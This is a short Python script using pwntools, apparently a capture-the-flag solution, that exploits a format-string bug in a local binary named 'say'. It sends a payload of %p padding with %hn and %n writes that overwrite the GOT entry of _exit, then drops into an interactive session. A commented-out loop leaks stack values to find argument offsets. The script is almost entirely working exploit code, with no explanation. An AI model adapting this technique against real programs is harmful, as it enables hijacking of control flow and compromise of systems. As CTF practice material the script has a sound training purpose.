from pwn import *

binary  = context.binary = ELF('./say')
r = process(binary.path)

# gdb.attach(r, api=True)
payload =b"%4798p%16$hn%257697559p%17$n----" +  p64(binary.got['_exit']) + p64(binary.got['_exit'] + 0x10)
r.sendafter(b"\n> ",payload)
print(r.recv())
r.interactive()

# for i in range(20):
#     r = process("./say")
#     r.send(f"%{i+1}$p")
#     log.info(f"{i} : \n")
#     log.info( r.recv())
#     r.interactive()

# 11